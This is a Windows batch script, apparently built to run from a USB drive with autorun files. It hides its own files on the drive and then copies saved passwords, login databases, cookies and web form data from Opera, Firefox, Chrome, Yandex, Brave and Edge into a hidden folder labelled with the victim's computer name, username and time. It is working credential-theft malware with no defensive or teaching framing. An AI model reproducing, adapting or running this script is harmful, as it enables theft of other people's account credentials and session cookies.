set folderName=%ComputerName%_%mydate%_%mytime%_%USERNAME%
@echo off
For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
For /f "tokens=1-3 delims=/:/ " %%a in ('time /t') do (set mytime=%%a-%%b-%%c)
set mytime=%mytime: =% 
md %~d0\bin\%folderName%
md %~d0\bin\%folderName%\Mozilla
md %~d0\bin\%folderName%\Opera
md %~d0\bin\%folderName%\Google
md %~d0\bin\%folderName%\Yandex
md %~d0\bin\%folderName%\Brave
md %~d0\bin\%folderName%\Edge
echo off
ATTRIB -R -A -S -H
attrib +h %~d0\bin
attrib +h %~d0\Icon.ico
attrib +h %~d0\file.bat
attrib +h %~d0\addon.vbs
attrib +h %~d0\autorun.inf
attrib +h %~d0\adv
attrib +h %~d0\adv\logs
CD/D %appdata%\Opera software\Opera stable\
copy /y "login data" %~d0\bin\%folderName%\Opera\
copy /y "Cookies" %~d0\bin\%folderName%\Opera\
copy /y "Web Data" %~d0\bin\%folderName%\Opera\	
echo off
CD/D %appdata%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite %~d0\bin\%folderName%\Mozilla
copy /y key3.db %~d0\bin\%folderName%\Mozilla
copy /y signons.sqlite %~d0\bin\%folderName%\Mozilla
echo off
CD/D %localappdata%\Google\Chrome\User Data\Default
copy /y "Login Data" %~d0\bin\%folderName%\Google
copy /y "Cookies" %~d0\bin\%folderName%\Google
copy /y "Web Data" %~d0\bin\%folderName%\Google
echo off
CD/D %localappdata%\Yandex\YandexBrowser\User Data\Default\
copy /y "Ya Login Data" %~d0\bin\%folderName%\Yandex
copy /y "Login Data" %~d0\bin\%folderName%\Yandex
copy /y "Cookies" %~d0\bin\%folderName%\Yandex
copy /y "Web Data" %~d0\bin\%folderName%\Yandex
echo off
CD/D %localappdata%\BraveSoftware\Brave-Browser\User Data\Default
copy /y "Login Data" %~d0\bin\%folderName%\Brave
copy /y "Cookies" %~d0\bin\%folderName%\Brave
copy /y "Web Data" %~d0\bin\%folderName%\Brave
echo off
CD/D %localappdata%\Microsoft\Edge\User Data\Default
copy /y "Login Data" %~d0\bin\%folderName%\Edge
copy /y "Cookies" %~d0\bin\%folderName%\Edge
copy /y "Web Data" %~d0\bin\%folderName%\Edge
@echo off
cls
